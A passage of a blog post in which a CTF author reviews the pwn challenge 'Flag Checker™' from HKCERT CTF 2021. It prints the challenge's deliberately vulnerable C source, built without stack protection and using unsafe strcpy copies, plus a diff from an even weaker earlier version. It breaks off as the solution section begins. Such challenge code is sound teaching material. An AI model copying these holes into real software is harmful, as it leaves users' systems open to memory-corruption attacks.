@@ -1,0 +1,684 @@
+<!DOCTYPE html>
+<html lang="en-us" dir="ltr" data-bs-theme="dark">
+<head>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>HKCERT CTF 2021 Postmortem (IV): The Remaining Ones | Mystify</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@300..700&family=Libre+Baskerville:ital,wght@0,400..700;1,400..700&family=Playfair+Display:ital,wght@0,400..900;1,400..900&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.3.8/css/bootstrap.min.css"
+  integrity="sha512-2bBQCjcnw658Lho4nlXJcc6WkV/UxpE/sAokbXPxQNGqmNdQrWqtw26Ns9kFF/yG792pKR1Sx8/Y1Lf1XN4GKA==" crossorigin="anonymous"
+  referrerpolicy="no-referrer" />
+<link rel="stylesheet" href="/css/main.min.27b43d01a5c4432e35e87df4c1026d71d0e56b69b492a4e65a5564c213f27fa9.css" integrity="sha256-J7Q9AaXEQy416H30wQJtcdDla2m0kqTmWlVkwhPyf6k=" crossorigin="anonymous">
+<link rel="stylesheet" href="/css/prism.min.ebb6c0bd3fe6ed4e16ec09f3b52903ee18ddfb21e33b6882030d951a91b213e4.css" integrity="sha256-67bAvT/m7U4W7AnztSkD7hjd&#43;yHjO2iCAw2VGpGyE&#43;Q=" crossorigin="anonymous">
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.3.8/js/bootstrap.min.js"
+  integrity="sha512-nKXmKvJyiGQy343jatQlzDprflyB5c+tKCzGP3Uq67v+lmzfnZUi/ZT+fc6ITZfSC5HhaBKUIvr/nTLCV+7F+Q==" crossorigin="anonymous"
+  referrerpolicy="no-referrer"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"
+  integrity="sha512-v2CJ7UaYy4JwqLDIrZUI/4hqeoQieOmAZNXBeQyjo21dadnwR+8ZaIJVT8EE2iyI61OV8e6M8PP2/4hpQINQ/g==" crossorigin="anonymous"
+  referrerpolicy="no-referrer"></script>
+        <script src="/js/main.f2979a93a325fecf9605263bd141398a311c8e23388ed7dcff74f92f7e632866.js" integrity="sha256-8peak6Ml/s&#43;WBSY70UE5ijEcjiM4jtfc/3T5L35jKGY=" crossorigin="anonymous"></script>
+        <script src="/js/prism.0ecb34b0181efd0f9aa6d1a8fc2e4814ffbdd9acc78d93d02a94e01f64f87f35.js" integrity="sha256-Dss0sBge/Q&#43;aptGo/C5IFP&#43;92azHjZPQKpTgH2T4fzU=" crossorigin="anonymous"></script>
+
+
+
+</head>
+<body class="overflow-y-scroll">
+  <nav class="navbar navbar-expand-lg sticky-top bg-body-tertiary">
+  <div class="container">
+    <a class="navbar-brand" href="/">Mystify</a>
+
+    <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNavAltMarkup" aria-controls="navbarNavAltMarkup" aria-expanded="false" aria-label="Toggle navigation">
+      <span class="navbar-toggler-icon"></span>
+    </button>
+    <div class="collapse navbar-collapse" id="navbarNavAltMarkup">
+      <div class="navbar-nav">
+        
+        
+          <a class="nav-link " href="/about-me/">
+            About Me 
+          </a>
+        
+          <a class="nav-link " href="/blogroll/">
+            Blogroll 
+          </a>
+        
+          <a class="nav-link " href="/crypto-in-ctf/">
+            Crypto in CTF 
+          </a>
+        
+      </div>
+    </div>
+  </div>
+</nav>
+
+  <main>
+    <div class="container mt-3">
+      
+  <div class="row justify-content-center">
+    <div class="col-8">
+      <h1 class="post-title">HKCERT CTF 2021 Postmortem (IV): The Remaining Ones</h1>
+
+      
+      <div class="text-muted pb-4">
+        
+          
+          
+          <time datetime="2021-11-18T16:05:03&#43;08:00">2021-11-18</time>
+        
+        
+        <span class="px-1">::</span>
+        
+        
+          <span class="badge rounded-pill bg-secondary">
+            <a href="https://mystiz.hk/tags/ctf/" class="text-muted text-decoration-none">#ctf</a>
+          </span>
+        
+          <span class="badge rounded-pill bg-secondary">
+            <a href="https://mystiz.hk/tags/hkcert-ctf/" class="text-muted text-decoration-none">#hkcert-ctf</a>
+          </span>
+        
+          <span class="badge rounded-pill bg-secondary">
+            <a href="https://mystiz.hk/tags/challenge-writing/" class="text-muted text-decoration-none">#challenge-writing</a>
+          </span>
+        
+          <span class="badge rounded-pill bg-secondary">
+            <a href="https://mystiz.hk/tags/web/" class="text-muted text-decoration-none">#web</a>
+          </span>
+        
+          <span class="badge rounded-pill bg-secondary">
+            <a href="https://mystiz.hk/tags/pwn/" class="text-muted text-decoration-none">#pwn</a>
+          </span>
+        
+          <span class="badge rounded-pill bg-secondary">
+            <a href="https://mystiz.hk/tags/algorithms/" class="text-muted text-decoration-none">#algorithms</a>
+          </span>
+        
+      </div>
+      
+
+      <div class="post-content js-toc-content"><div>
+          <p>We will cover the remaining challenges I wrote in this part: <em>Flag Checker™</em>, <em>The Wilderness</em> and <em>Potion of Ciphermath</em>.</p>
+<h2 id="幫緊你幫緊你--flag-checker-pwn">幫緊你！幫緊你！ / Flag Checker™ (Pwn)<a href="#幫緊你幫緊你--flag-checker-pwn" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<h3 id="challenge-summary">Challenge Summary<a href="#challenge-summary" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<blockquote>
+<p><em>幫緊你 幫緊你</em><br>
+<em>當無力 堅持集氣幫你</em><br>
+<em>等風向轉天氣</em><br>
+<em>請相信你不死</em><br>
+<em>組隊會撐得起</em><br>
+<em>You will be Ok</em><br>
+<em>You will be Ok</em></p>
+<p>We are here to help validating your flag! Come use our Flag Checker™!</p>
+<p><code>nc HOST PORT</code></p>
+<p>Attachments: <a href="https://github.com/samueltangz/ctf-archive-created/blob/master/20211112-hkcert-ctf/flag-checker-tm/public/service.c"
+   
+   target="_blank" rel="noopener noreferrer" >service.c</a><svg t="1713426496023" style="margin: 0 0 0 5px;" class="icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="8864" width="10" height="10">
+    <path d="M1001.627381 394.106435a44.521739 44.521739 0 1 1-88.598261 0V208.228174l-398.914783 398.914783a54.049391 54.049391 0 1 1-76.577391-76.310261l397.579131-397.490087h-182.984348a44.78887 44.78887 0 1 1 0-89.043479h298.740869c1.335652 0 2.226087 0.534261 3.561739 0.623305s1.78087-0.623304 2.671305-0.623305a40.069565 40.069565 0 0 1 27.158261 11.620174c1.157565 0.667826 2.226087 1.513739 3.116521 2.448696 0.890435 0.979478 1.78087 2.092522 2.671305 3.161043a41.360696 41.360696 0 0 1 11.575652 27.158261c0 0.979478-0.445217 1.825391-0.445218 2.80487s0.445217 2.359652 0.445218 3.650783v298.963478zM111.192598 934.956522h712.347826v-400.695652h89.043479v400.695652a89.043478 89.043478 0 0 1-89.043479 89.043478H111.192598a89.043478 89.043478 0 0 1-89.043478-89.043478V222.608696a89.043478 89.043478 0 0 1 89.043478-89.043479h400.695652v89.043479H111.192598v712.347826z" fill="#666666" p-id="8865"></path>
+</svg>, <a href="https://github.com/samueltangz/ctf-archive-created/blob/master/20211112-hkcert-ctf/flag-checker-tm/public/service"
+   
+   target="_blank" rel="noopener noreferrer" >service</a><svg t="1713426496023" style="margin: 0 0 0 5px;" class="icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="8864" width="10" height="10">
+    <path d="M1001.627381 394.106435a44.521739 44.521739 0 1 1-88.598261 0V208.228174l-398.914783 398.914783a54.049391 54.049391 0 1 1-76.577391-76.310261l397.579131-397.490087h-182.984348a44.78887 44.78887 0 1 1 0-89.043479h298.740869c1.335652 0 2.226087 0.534261 3.561739 0.623305s1.78087-0.623304 2.671305-0.623305a40.069565 40.069565 0 0 1 27.158261 11.620174c1.157565 0.667826 2.226087 1.513739 3.116521 2.448696 0.890435 0.979478 1.78087 2.092522 2.671305 3.161043a41.360696 41.360696 0 0 1 11.575652 27.158261c0 0.979478-0.445217 1.825391-0.445218 2.80487s0.445217 2.359652 0.445218 3.650783v298.963478zM111.192598 934.956522h712.347826v-400.695652h89.043479v400.695652a89.043478 89.043478 0 0 1-89.043479 89.043478H111.192598a89.043478 89.043478 0 0 1-89.043478-89.043478V222.608696a89.043478 89.043478 0 0 1 89.043478-89.043479h400.695652v89.043479H111.192598v712.347826z" fill="#666666" p-id="8865"></path>
+</svg></p>
+</blockquote>
+<p>When connected to the server, we are asked the name. We are also given 256 attempts to guess the flag. In the each attempt, we are asked to guess the flag (<code>flag</code>) and the MD5 digest of <code>attempt[k]_[guessed_flag]</code> will be stored to <code>ctx.attempts[k]</code>.</p>
+<p>After the users has sent their guesses, the server will compute the MD5 digests of <code>attempt00_[flag]</code>, <code>attempt01_[flag]</code>, ..., <code>attemptff_[flag]</code> and check the number of hashes are matched. The flag will be printed if there are over 128 matches. Otherwise, a random digest will be returned.</p>
+<p>Well, I know no one could play pwnable without either the binary or the source code. There you go (it is provided to the players along with the binary, too):</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;signal.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;time.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;openssl/md5.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">typedef</span> <span class="k">struct</span> <span class="n">Context</span> <span class="n">Context</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">Context</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">flag</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">hashed_flag</span><span class="p">[</span><span class="mi">256</span><span class="p">][</span><span class="mi">16</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">attempts</span><span class="p">[</span><span class="mi">256</span><span class="p">][</span><span class="mi">16</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">name</span><span class="p">[</span><span class="mi">48</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="n">FILE</span> <span class="o">*</span><span class="n">urandom</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">};</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">print_flag</span><span class="p">(</span><span class="kt">int</span> <span class="n">score</span><span class="p">,</span> <span class="n">Context</span> <span class="o">*</span><span class="n">ctx</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">score</span> <span class="o">&gt;=</span> <span class="mi">128</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Congratulations, your guess is correct!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Please take this shiny flag: %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">ctx</span><span class="o">-&gt;</span><span class="n">flag</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">int</span> <span class="n">random_leak</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">fread</span><span class="p">(</span><span class="o">&amp;</span><span class="n">random_leak</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">ctx</span><span class="o">-&gt;</span><span class="n">urandom</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">random_leak</span> <span class="o">&amp;=</span> <span class="mh">0xff</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;No. You scored only %d. Try harder!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">score</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;I can even tell you one of the hash values: &#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="mi">16</span><span class="p">;</span> <span class="n">j</span><span class="o">++</span><span class="p">)</span> <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;%02x&#34;</span><span class="p">,</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span><span class="p">)</span><span class="n">ctx</span><span class="o">-&gt;</span><span class="n">hashed_flag</span><span class="p">[</span><span class="n">random_leak</span><span class="p">][</span><span class="n">j</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">init</span> <span class="p">(</span><span class="n">Context</span> <span class="o">*</span><span class="n">ctx</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">FILE</span> <span class="o">*</span><span class="n">fd_flag</span> <span class="o">=</span> <span class="nf">fopen</span><span class="p">(</span><span class="s">&#34;flag.txt&#34;</span><span class="p">,</span> <span class="s">&#34;r&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">fd_flag</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nf">fread</span><span class="p">(</span><span class="n">ctx</span><span class="o">-&gt;</span><span class="n">flag</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">47</span><span class="p">,</span> <span class="n">fd_flag</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">47</span><span class="p">)</span> <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">FILE</span> <span class="o">*</span><span class="n">fd_urandom</span> <span class="o">=</span> <span class="nf">fopen</span><span class="p">(</span><span class="s">&#34;/dev/urandom&#34;</span><span class="p">,</span> <span class="s">&#34;r&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">fd_urandom</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="k">return</span> <span class="mi">2</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ctx</span><span class="o">-&gt;</span><span class="n">urandom</span> <span class="o">=</span> <span class="n">fd_urandom</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">read_line</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">ptr</span><span class="p">,</span> <span class="kt">int</span> <span class="n">length</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">real_length</span> <span class="o">=</span> <span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">ptr</span><span class="p">,</span> <span class="n">length</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">ptr</span><span class="p">[</span><span class="n">real_length</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="sc">&#39;\n&#39;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">ptr</span><span class="p">[</span><span class="n">real_length</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">sig_handler</span> <span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Too slow!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">correct_guesses</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">tmp</span><span class="p">[</span><span class="mi">4096</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">Context</span> <span class="n">ctx</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">MD5_CTX</span> <span class="n">md5_ctx</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">switch</span> <span class="p">(</span><span class="nf">init</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ctx</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">default</span><span class="o">:</span> <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">case</span> <span class="mi">1</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">            <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Cannot read flag.txt</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">case</span> <span class="mi">2</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">            <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Cannot read /dev/urandom</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Hello! What is your name? &#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">read_line</span><span class="p">(</span><span class="n">ctx</span><span class="p">.</span><span class="n">name</span><span class="p">,</span> <span class="mi">32</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Hey %s. So you are now given 256 tries to guess the flag. I will tell you if have at least 128 correct guesses.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">ctx</span><span class="p">.</span><span class="n">name</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">256</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">// ctx.attempts[i] := md5(prefix + input)
+</span></span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;&gt; &#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">sprintf</span><span class="p">(</span><span class="n">tmp</span><span class="p">,</span> <span class="s">&#34;attempt%02x_&#34;</span><span class="p">,</span> <span class="n">i</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">read_line</span><span class="p">(</span><span class="n">tmp</span><span class="o">+</span><span class="mi">10</span><span class="p">,</span> <span class="mi">256</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">MD5_Init</span><span class="p">(</span><span class="o">&amp;</span><span class="n">md5_ctx</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">MD5_Update</span><span class="p">(</span><span class="o">&amp;</span><span class="n">md5_ctx</span><span class="p">,</span> <span class="n">tmp</span><span class="p">,</span> <span class="nf">strlen</span><span class="p">(</span><span class="n">tmp</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">MD5_Final</span><span class="p">(</span><span class="n">ctx</span><span class="p">.</span><span class="n">attempts</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="o">&amp;</span><span class="n">md5_ctx</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="nf">signal</span><span class="p">(</span><span class="n">SIGALRM</span><span class="p">,</span> <span class="n">sig_handler</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">alarm</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">256</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">sprintf</span><span class="p">(</span><span class="n">tmp</span><span class="p">,</span> <span class="s">&#34;attempt%02x_&#34;</span><span class="p">,</span> <span class="n">i</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">strcpy</span><span class="p">(</span><span class="n">tmp</span><span class="o">+</span><span class="mi">10</span><span class="p">,</span> <span class="n">ctx</span><span class="p">.</span><span class="n">flag</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">MD5_Init</span><span class="p">(</span><span class="o">&amp;</span><span class="n">md5_ctx</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">MD5_Update</span><span class="p">(</span><span class="o">&amp;</span><span class="n">md5_ctx</span><span class="p">,</span> <span class="n">tmp</span><span class="p">,</span> <span class="nf">strlen</span><span class="p">(</span><span class="n">tmp</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">MD5_Final</span><span class="p">(</span><span class="n">ctx</span><span class="p">.</span><span class="n">hashed_flag</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="o">&amp;</span><span class="n">md5_ctx</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="nf">strcpy</span><span class="p">(</span><span class="n">tmp</span><span class="p">,</span> <span class="n">ctx</span><span class="p">.</span><span class="n">attempts</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">tmp</span><span class="p">[</span><span class="mi">16</span><span class="p">]</span> <span class="o">=</span> <span class="n">ctx</span><span class="p">.</span><span class="n">hashed_flag</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="mi">16</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nf">strcmp</span><span class="p">(</span><span class="n">tmp</span><span class="p">,</span> <span class="n">ctx</span><span class="p">.</span><span class="n">hashed_flag</span><span class="p">[</span><span class="n">i</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">correct_guesses</span> <span class="o">+=</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">correct_guesses</span> <span class="o">&gt;=</span> <span class="mi">128</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nf">print_flag</span><span class="p">(</span><span class="n">correct_guesses</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ctx</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// gcc -o service service.c -fno-stack-protector -lcrypto
+</span></span></span></code></pre></div><h3 id="motivation">Motivation<a href="#motivation" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<div class="alert danger">
+  <strong>😱 Mystiz even writes a pwn challenge?????</strong> I know, I know. This is strange.
+</div>
+
+<p>It was a challenge that I intentionally made for Black Bauhinia's internal Attack and Defense. Unfortunately an A&amp;D is very hard to make with only one person and I decided to release it in a jeopardy CTF.</p>
+<p>The main point is that I was trying to develop everything <em>on my own</em>. That said, I have to write challenges - and of course a pwnable one. Luckily I was not trying to make an advanced one, or I would need to learn <em>House of [put an arbitrary word here]</em> which probably makes me braindead.</p>
+<p>The original version includes far more vulnerabilities, as it is expected to be patched during the game.</p>
+<ol>
+<li>There are less binary protections (PIE is disabled).</li>
+<li><code>attempt00_[flag]</code>, <code>attempt01_[flag[1:]]</code>, ..., <code>attempt1f_[flag[31:]]</code> and so on are hashed.</li>
+<li>The flag was only 32 characters long.</li>
+</ol>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-diff" data-lang="diff"><span class="line"><span class="cl"><span class="gu">36c36
+</span></span></span><span class="line"><span class="cl"><span class="gd">&lt;     if (fread(ctx-&gt;flag, 1, 32, fd_flag) != 32) return 1;
+</span></span></span><span class="line"><span class="cl"><span class="gs">---
+</span></span></span><span class="line"><span class="cl"><span class="gi">&gt;     if (fread(ctx-&gt;flag, 1, 47, fd_flag) != 47) return 1;
+</span></span></span><span class="line"><span class="cl"><span class="gu">95,96d94
+</span></span></span><span class="line"><span class="cl"><span class="gd">&lt;         // ctx.hashed_flag[i] := md5(PREFIX + ctx.flag[(i%32):])
+</span></span></span><span class="line"><span class="cl"><span class="gd">&lt;         int j = i % 32;
+</span></span></span><span class="line"><span class="cl"><span class="gu">98c96
+</span></span></span><span class="line"><span class="cl"><span class="gd">&lt;         strcpy(tmp+10, ctx.flag + j);
+</span></span></span><span class="line"><span class="cl"><span class="gs">---
+</span></span></span><span class="line"><span class="cl"><span class="gi">&gt;         strcpy(tmp+10, ctx.flag);
+</span></span></span><span class="line"><span class="cl"><span class="gu">118c116
+</span></span></span><span class="line"><span class="cl"><span class="gd">&lt; // gcc -o service service.c -no-pie -fno-stack-protector -lcrypto
+</span></span></span><span class="line"><span class="cl"><span class="gs">---
+</span></span></span><span class="line"><span class="cl"><span class="gi">&gt; // gcc -o service service.c -fno-stack-protector -lcrypto
+</span></span></span></code></pre></div><p>With (2) and (3), we can get hashes of <code>attempt1f_X</code>, <code>attempt3f_X</code>, ... at a chance of $1/32$ upon failing. Since only one byte of the flag is hashed, it could be easily exhaustable. By collecting enough hashes we could recover the flag. Therefore, there are ways to solve the challenge without pwnable skills.</p>
+<h3 id="solution">Solution<a href="#solution" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>Here are some snippets of the source code where the weakness resides:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">Context</span> <span class="p">{</span>
